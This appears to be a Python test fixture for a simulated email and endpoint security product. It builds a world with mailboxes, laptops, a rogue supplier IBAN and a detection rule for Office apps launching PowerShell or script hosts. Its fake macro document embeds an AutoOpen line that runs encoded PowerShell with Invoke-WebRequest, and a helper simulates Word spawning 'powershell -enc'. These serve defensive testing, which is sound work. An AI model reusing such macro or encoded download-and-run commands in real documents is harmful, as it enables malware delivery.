import io, os, zipfile
from rig3 import *
from halvard.courier.mail import Message, Attachment
from halvard.ward.agent import ProtectedFS
from halvard.signet.idp import AuthError

OFFICE_RULE = dict(name="Office app started a script interpreter", description="Word, Excel or Outlook launched PowerShell, cmd or a script host",
                   query='kind=process AND op=exec AND parent_proc in ("winword.exe","excel.exe","outlook.exe") AND proc in ("powershell.exe","cmd.exe","wscript.exe","mshta.exe")',
                   techniques=["T1059.001"], severity="high", confidence=0.75,
                   tests={"positive": [dict(kind="process", op="exec", parent_proc="winword.exe", proc="powershell.exe")], "negative": [dict(kind="process", op="exec", parent_proc="explorer.exe", proc="powershell.exe")]})
SUPPLIER_IBAN = "GB82WEST12345698765432"
ROGUE_IBAN = "GB29NWBK60161331926819"


def docx_like(payload=b""):
    """A document container that looks ordinary to static analysis (no macro, no downloader strings)."""
    z = io.BytesIO(); zf = zipfile.ZipFile(z, "w"); zf.writestr("[Content_Types].xml", "x"); zf.writestr("word/document.xml", "Please review. " + payload.decode()); zf.close(); return z.getvalue()


def macro_doc():
    z = io.BytesIO(); zf = zipfile.ZipFile(z, "w"); zf.writestr("[Content_Types].xml", "x"); zf.writestr("word/vbaProject.bin", b"Sub AutoOpen() powershell -enc AAAA Invoke-WebRequest http://x/y End Sub"); zf.close(); return z.getvalue()


class World4(World):
    def __init__(self, **kw):
        kw.setdefault("auto", True)
        super().__init__(**kw)
        cp = self.cp
        cp.engine.auth.policy.accepted_patterns |= {"mail_clawback", "malicious_mail_containment", "identity_takeover_containment"}
        cp.partner_domains = {"globex-supplies.com"}; cp.courier.partners = {"globex-supplies.com"}; cp.courier.imp.partners = {"globex-supplies.com"}; cp.courier.imp.trusted = cp.courier.own | cp.courier.partners
        cp.courier.links.protected = cp.courier.own | cp.courier.partners
        cp.courier.imp.supplier_ibans = {"globex-supplies.com": {__import__("halvard.courier.impersonation", fromlist=["x"]).iban_hash(SUPPLIER_IBAN)}}
        for u in ("alice", "bob", "maria"): cp.mail.add_mailbox(f"{u}@acme.com", f"{u}@acme.com")
        cp.courier.sync_graph()
        # second laptop, bob's
        self.agent2, self.host2, _, self.fs2 = make_agent(os.path.join(self.tmp, "lt22"), asset_class="standard")
        self.agent2.clock = self.clock; self.agent2.engine.clock = self.clock; self.agent2.spool.clock = self.clock; self.agent2.journal.clock = self.clock; self.agent2.device_id = "LT-22"
        cp.enroll_device(self.agent2, "bob@acme.com"); cp.signet.sync_graph(); cp.courier.sync_graph(); cp.signet.link_device("p:bob", "LT-22")
        lib = DetectionLibrary(self.clock); au, rv = Principal("u-a", "analyst"), Principal("u-r", "analyst"); lib.pack_version = 10        # newer than the pack World installed
        for spec in (OFFICE_RULE, STEALER_RULE):
            r = lib.create(au, dict(spec, expires_at=self.clock.now() + 90 * 86400)); lib.submit(r, au); lib.approve(r, rv)
        pack = lib.build_pack(KEY)
        for a in (self.agent, self.agent2): a.apply_content(pack, KEY)
        cp.process()          # clear any startup noise

    # ---------------- helpers ----------------
    def send(self, sender, subject, body, to=("alice@acme.com",), attachments=(), links=(), display_name=None, reply_to=None, auth=None):
        self._i = getattr(self, "_i", 0) + 1
        m = Message(f"M-{self._i}", self.clock.now(), sender, display_name or sender, subject, body, list(to), reply_to, [Attachment(n, d) for n, d in attachments], list(links),
                    auth or {"spf": "pass", "dkim": "pass", "dmarc": "pass"})
        return self.cp.mail.deliver(m)

    def opens_on_laptop(self, mailbox, msg, name, agent=None, host=None, fs=None, device="LT-17", pid=700):
        """The user opens the attachment: the mail client saves it, Word starts, and (for the bad case) Word starts PowerShell."""
        agent, host, fs = agent or self.agent, host or self.host, fs or self.fs
        att = self.cp.mail.open_attachment(mailbox, msg.id, name, device_id=device)
        host.spawn(pid - 1, "outlook.exe"); host.spawn(pid, "winword.exe", ppid=pid - 1)
        fs.create(pid - 1, os.path.join(self.tmp, "mailtmp", name), att.data)           # the mail client saves it (Ward hashes document types)
        return att

    def word_spawns_powershell(self, host=None, agent=None, pid=701, parent=700):
        host, agent = host or self.host, agent or self.agent
        host.spawn(pid, "powershell.exe", ppid=parent, cmdline="powershell -enc SQBFAFgA"); agent.emit("process", "exec", pid, "C:/Windows/System32/powershell.exe")
